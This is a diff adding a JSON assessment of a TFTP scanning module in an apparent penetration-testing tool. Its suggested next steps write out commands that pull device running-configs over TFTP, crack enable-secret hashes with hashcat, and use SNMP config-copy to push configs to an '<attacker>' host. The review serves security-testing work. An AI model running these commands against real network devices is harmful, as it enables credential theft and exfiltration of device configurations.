@@ -1,0 +1,39 @@
+{
+  "service": "tftp",
+  "summary": "tftp module is small but hits the right primitive: UDP RRQ against a curated list of vendor config filenames (running-config, startup-config, config.text, vlan.dat, router.cfg, sipdefault.cnf, SEPDEFAULT.cnf, etc.). Emits tftp_readable (critical when the hit is a device config \u2014 first 200 bytes returned as hex proof) or tftp_open (medium, server answered but no known files). Biggest gap: candidate list is very small (10 entries); no attempt to walk phone-provisioning conventions (SEP<MAC>.cnf.xml with MAC harvested from other services), no chain into SNMP RW community for the classic config-copy pivot (mentioned in runbook, not automated), and no write-probe.",
+  "module_files": [
+    "recce/services/tftp.py"
+  ],
+  "proposed_shared_surface_consumers": [
+    "known_users",
+    "known_hostnames",
+    "cleartext_creds",
+    "snmp_rw_community"
+  ],
+  "findings": [
+    {
+      "kind": "tftp_readable",
+      "title_pattern": "TFTP serves vendor config / provisioning files unauthenticated",
+      "severity": "critical",
+      "tier": "t2",
+      "tier_evidence": "TFTP DATA block-1 actually returned for a probed filename (first 200 bytes retained as hex sample) \u2014 a proven read of a device config/provisioning bundle with zero auth (T2 arbitrary-read primitive; T3 realistically because the file IS the running-config with enable-secret and community strings).",
+      "can_promote_to": "t3",
+      "promotion_notes": "Auto-pull the full file (loop until block < 512 bytes), parse for enable-secret / community strings / SIP credentials, feed known_creds. Currently only samples the first 200 bytes.",
+      "promotion_risk": "low",
+      "tester_next_step": "atftp --get -r running-config -l loot/IP-running-config IP ; grep -Ei 'enable secret|snmp-server community|username|line vty' loot/IP-running-config ; hashcat -m 500 (type 5) or -m 9200 (type 8) enable-secret.",
+      "related_cves": []
+    },
+    {
+      "kind": "tftp_open",
+      "title_pattern": "TFTP server reachable (unauthenticated by design)",
+      "severity": "medium",
+      "tier": "t1",
+      "tier_evidence": "Server answered at least one probe (with error code) \u2014 TFTP is confirmed live, but no known filename was readable.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Expand candidate list (nmap tftp-enum ships ~200 vendor paths); chain SNMP-RW-community discovery: use snmpset ... configCopyProtocol=TFTP + configCopySourceFileName='running-config' + configCopyDestinationFileName='pwn' + configCopyDestinationAddressType=1 + configCopyDestinationAddress=<attacker> to push the config, then read it via TFTP here.",
+      "promotion_risk": "high",
+      "tester_next_step": "nmap -sU -p69 --script tftp-enum IP ; for RW community: snmpset -v2c -c <RW> IP 1.3.6.1.4.1.9.9.96.1.1.1.1.14.111 i 1 ... (Cisco config-copy MIB); then get the pushed file locally via tftp; grep enable-secret.",
+      "related_cves": []
+    }
+  ]
+}
